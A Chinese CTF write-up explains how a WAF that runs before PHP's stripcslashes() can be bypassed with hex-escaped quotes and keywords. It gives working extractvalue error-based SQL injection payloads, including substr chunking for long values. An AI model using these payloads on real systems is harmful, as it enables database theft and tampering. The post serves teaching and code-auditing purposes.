---
title: "利用 stripcslashes 绕过 WAF 实现 SQL 注入"
date: 2025-01-01
draft: false
description: "当 WAF 检查在 stripcslashes() 之前执行时，如何绕过关键字和特殊字符过滤"
categories: ["CTF Writeup"]
tags: ["web", "SQL注入", "WAF绕过"]
---

## 场景

一个 PHP 应用存在 SQL 注入点，但有 WAF 保护：

- 拦截单引号 `'`
- 拦截 `select`、`insert`、`update`、`delete` 等关键字
- 拦截非 ASCII 字符

看起来封得很死。但服务端代码有一个细节：WAF 检查之后，输入会经过 PHP 的 [`stripcslashes()`](https://www.php.net/manual/zh/function.stripcslashes.php) 处理，然后才拼入 SQL。

## stripcslashes 做了什么

这个函数把 C 风格的转义序列还原为对应字符：

| 输入 | 输出 |
|------|------|
| `\x27` | `'`（单引号，ASCII 0x27） |
| `\x73` | `s`（ASCII 0x73） |
| `\n` | 换行符 |
| `\047` | `'`（八进制） |

## 时序漏洞

处理流程是这样的：

```
用户输入 → WAF检查 → stripcslashes() → 拼入SQL → 执行
```

WAF 看到的是 `\x27`（一个反斜杠、一个 x、一个 2、一个 7），完全合法，不会拦截。但 `stripcslashes()` 会把它还原成真正的单引号 `'`。

同理，`\x73elect` 在 WAF 眼里不包含 `select` 关键字，但处理后就变成了 `select`。

一个函数同时绕过了两层防护。

## 注入手法

假设注入点在一个 DELETE 语句中：

```php
$sql = "delete from users where id=$id and msg='$exp'";
```

用 [extractvalue 报错注入](https://www.cnblogs.com/laoxiajiadeyun/p/10278512.html) 回显数据。`extractvalue()` 在 XPath 表达式出错时会把查询结果夹带在错误信息里。

Payload：

```
\x27 or extractvalue(1,concat(0x7e,(\x73elect column_name from information_schema.columns limit 0,1)))#
```

WAF 看到的——没有单引号，没有 select，放行。

`stripcslashes` 处理后实际执行的：

```sql
delete from users where id=1 and msg='' or extractvalue(1,concat(0x7e,(select column_name from information_schema.columns limit 0,1)))#'
```

错误信息里就会带出查询结果。

## 处理 32 字符限制

`extractvalue` 报错回显最多 32 个字符。如果目标数据比较长，用 `substr` 分段读：

```
-- 前30个字符
\x27 or extractvalue(1,concat(0x7e,substr((\x73elect data from target limit 0,1),1,30)))#

-- 第30个字符起
\x27 or extractvalue(1,concat(0x7e,substr((\x73elect data from target limit 0,1),30,30)))#
```

拼起来就是完整内容。

## 小结

这个案例的核心教训：**WAF 和数据处理的时序很重要**。如果 WAF 在某个转换函数之前检查输入，而那个函数会改变输入的语义，那 WAF 就形同虚设。

`stripcslashes` 不是唯一有这个问题的函数。类似的还有 `urldecode`（二次 URL 解码）、`base64_decode` 等。审计代码时，留意输入在 WAF 之后还会经过哪些变换。
